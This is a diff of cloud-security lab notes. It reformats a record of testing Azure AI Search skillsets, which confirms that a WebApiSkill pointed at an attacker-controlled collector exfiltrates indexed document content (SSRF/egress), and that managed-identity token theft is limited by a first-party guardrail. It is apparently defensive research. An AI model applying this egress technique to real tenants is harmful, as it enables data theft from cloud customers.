@@ -16,22 +16,7 @@ Wiki: `az-ai-search-privesc.md`.
 - **Network opening not tested end-to-end.** Free tier rejected `publicNetworkAccess:disabled` with `Private endpoint access is not supported for the selected SKU free`, so there was no closed network boundary to reopen. The billable-tier network claim remains vendor-doc grounded.
 - **Logs.** `az monitor activity-log list` returned `Microsoft.Search/searchServices/write` (Started and Succeeded) and `Microsoft.Search/searchServices/listAdminKeys/action` (Started and Succeeded) after ingestion delay. The first immediate query returned `[]`; the later query after deletion contained the events. Key-authenticated `GET /indexes` requests are data-plane and require AI Search `OperationLogs` diagnostics to be retained.
 
-**Lab record (test #5, 2026-09-24, independent reproduction):** RG `htrc-aisearch`, Basic search service
-`htrcsrch29616` (system-assigned MI `9f8f329d…`), collector = a Container App running
-`mendhak/http-https-echo` with HTTPS ingress (`*.azurecontainerapps.io` valid cert), blob data source +
-index + indexer.
-- **SSRF / egress = WORKS.** A `WebApiSkill` with `uri=https://<collector>/ssrf-from-search` (no
-  `authResourceId`) caused the indexer run to make an outbound POST to the attacker URL. Collector logs
-  showed `user-agent: CognitiveSearch/WebApiSkill`, Azure egress IP `20.42.4.144`, carrying the document
-  content. So `skillsets/write` (or `debugSessions`) = a confused-deputy egress/SSRF channel from the
-  Search service's network position (HTTPS-only target).
-- **MI-token exfil = CONSTRAINED (guardrail confirmed).** Setting `authResourceId` to the ARM first-party
-  app id `797f4846-...` was **rejected**: *"targets a Microsoft first-party application… must identify your
-  own application."* Format must be `api://{id}`, `api://{id}/.default`, or `{id}/.default`. So the token
-  the service would attach can only target an **attacker-registered** app — NOT a replayable ARM/Graph/
-  Storage/KV credential. Could not complete the token leg here (lab has no Graph directory-write to register
-  an app), but the guardrail is the key finding.
-- **Wiki already documents this comprehensively** (`az-ai-search-privesc.md` L107-146, commit d1527e426,
-  incl. a decoded JWT captured via a registered app + the same first-party guardrail + the debugSessions
-  on-demand and vectorizer-repoint query-time variants). **No wiki change** — this was an independent
-  reproduction that also adds the plain SSRF/egress observation. **Teardown:** `az group delete htrc-aisearch`.
+**Lab record (test #5, 2026-09-24, independent reproduction):** RG `htrc-aisearch`, Basic search service `htrcsrch29616` (system-assigned MI `9f8f329d…`), collector = a Container App running `mendhak/http-https-echo` with HTTPS ingress (`*.azurecontainerapps.io` valid cert), blob data source + index + indexer.
+- **SSRF / egress = WORKS.** A `WebApiSkill` with `uri=https://<collector>/ssrf-from-search` (no `authResourceId`) caused the indexer run to make an outbound POST to the attacker URL. Collector logs showed `user-agent: CognitiveSearch/WebApiSkill`, Azure egress IP `20.42.4.144`, carrying the document content. So `skillsets/write` (or `debugSessions`) = a confused-deputy egress/SSRF channel from the Search service's network position (HTTPS-only target).
+- **MI-token exfil = CONSTRAINED (guardrail confirmed).** Setting `authResourceId` to the ARM first-party app id `797f4846-...` was **rejected**: *"targets a Microsoft first-party application… must identify your own application."* Format must be `api://{id}`, `api://{id}/.default`, or `{id}/.default`. So the token the service would attach can only target an **attacker-registered** app — NOT a replayable ARM/Graph/ Storage/KV credential. Could not complete the token leg here (lab has no Graph directory-write to register an app), but the guardrail is the key finding.
+- **Wiki already documents this comprehensively** (`az-ai-search-privesc.md` L107-146, commit d1527e426, incl. a decoded JWT captured via a registered app + the same first-party guardrail + the debugSessions on-demand and vectorizer-repoint query-time variants). **No wiki change** — this was an independent reproduction that also adds the plain SSRF/egress observation. **Teardown:** `az group delete htrc-aisearch`.
